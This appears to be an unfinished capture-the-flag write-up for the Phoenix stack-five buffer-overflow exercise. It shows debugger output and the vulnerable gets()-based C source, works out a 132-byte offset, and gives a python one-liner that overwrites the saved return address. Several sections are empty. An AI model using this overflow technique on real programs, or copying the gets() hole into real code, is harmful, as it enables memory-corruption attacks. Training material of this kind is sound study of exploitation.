# Phoenix Stack5
### Result
### Learning
This challenge started with a question:

> As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.

You had to overwrite the return address and jump to self-written / downloaded `shellcode`.  Invoking your own `shellcode` was possible as the stack5 used `gets`.

### Calculate buffer to overflow
```
/ (fcn) sym.start_level 36
|           0x000104f0      80d04de2       sub sp, sp, 0x80   <-- space for local var
|           0x000104f4      84304be2       sub r3, fp, 0x84   <-- same as above
|           0x000104f8      0300a0e1       mov r0, r3                  ; char *s
|           0x000104fc      9dffffeb       bl sym.imp.gets             ; char *gets(char *s)
```
The bytes allocated when setting up the `start_level Stack` suggested a `128 buffer` and a `4 byte pointer`.  Looking at the disassembled function, I guessed the `4 byte pointer` was the actual reference to the buffer, as opposed to the `return char *` that was passed back to the caller with `gets`.

### Debugger Analysis
##### Verify the Buffer size
```
gef> b *start_level + 24      <-- // breakpoint on first instruction after gets()

gef> disas start_level
Dump of assembler code for function start_level:
   0x000104e8 <+0>:	push	{r11, lr}
   0x000104ec <+4>:	add	r11, sp, #4
   0x000104f0 <+8>:	sub	sp, sp, #128	; 0x80.      <-- re-affirm size of buffer
   0x000104f4 <+12>:	sub	r3, r11, #132	; 0x84
   0x000104f8 <+16>:	mov	r0, r3
   0x000104fc <+20>:	bl	0x10378 <gets@plt>
=> 0x00010500 <+24>:	nop			; (mov r0, r0)
   0x00010504 <+28>:	sub	sp, r11, #4
   0x00010508 <+32>:	pop	{r11, pc}
```
You could read the disassembled code to see the Char buffer size.
```
gef> p/u 0x80
$5 = 128
```
##### Return Address
```
gef> r < AAAA

$r11 : 0xfffefd74
$sp  : 0xfffefcf0

// You reached the same answer, regardless of whether you filled the 128-char Buffer
gef> p/u $fp - $sp      
$1 = 132
```
##### Return Address, a better way to find
```
gef> r < AAAA

gef> find $sp, +200,0x0001052c
0xfffefd74
1 pattern found.

gef> p/u 0xfffefd74 - 0xfffefcf0
$11 = 132

// if you didn't guess it, these addresses the stack pointer and the frame pointer:
$sp  : 0xfffefcf0
$r11 : 0xfffefd74
```
##### Overwrite the Return Address
```
gef> r <<< $(python -c 'print "A"*132 + "\x43\x43\x43\x43"')
```
##### Better answers

##### Run the code
```
$ ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAA
```  
##### Symbols
```
// cut down for brevity
[0x000103b4]> is~FUNC
072 0x000004e8 0x000104e8 GLOBAL   FUNC   36 start_level
079 0x0000050c 0x0001050c GLOBAL   FUNC   52 main
002 0x00000378 0x00010378 GLOBAL   FUNC   16 imp.gets
003 0x00000384 0x00010384 GLOBAL   FUNC   16 imp.puts
```
##### Seek and disassemble
```
```
##### Debugger

##### Answer


##### Source code
```
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
